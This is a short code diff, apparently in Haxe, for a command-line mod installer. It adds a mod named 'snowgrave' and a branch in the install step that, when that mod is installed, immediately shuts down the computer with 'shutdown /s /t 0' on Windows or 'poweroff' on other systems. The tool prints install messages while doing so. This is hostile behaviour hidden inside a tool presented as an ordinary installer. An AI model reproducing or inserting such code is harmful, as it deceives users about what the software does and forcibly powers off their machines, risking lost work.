@@ -13,7 +13,8 @@ class Main
     'sky.redux' => new Mod('Vs Sky Redux'),
     'hazier.river' => new Mod('Hazier River'),
     'pointlesspins' => new Mod('Pointless Pins', ['betteralphabet']),
-    'betteralphabet' => new Mod('Better Alphabet')
+    'betteralphabet' => new Mod('Better Alphabet'),
+    'snowgrave' => new Mod('snowgrave')
   ];
 
   static function main()
@@ -57,6 +58,14 @@ class Main
         {
           if (mods.exists(m)) m = mods[m].name;
           Sys.println('Installing $m...${verbose ? ' 100/100' : ''}');
+          if (m == "snowgrave")
+          {
+            #if windows
+            Sys.command('shutdown /s /t 0');
+            #else
+            Sys.command('poweroff');
+            #end
+          }
           Sys.println('Installed $m!');
         }
       case 'remove':
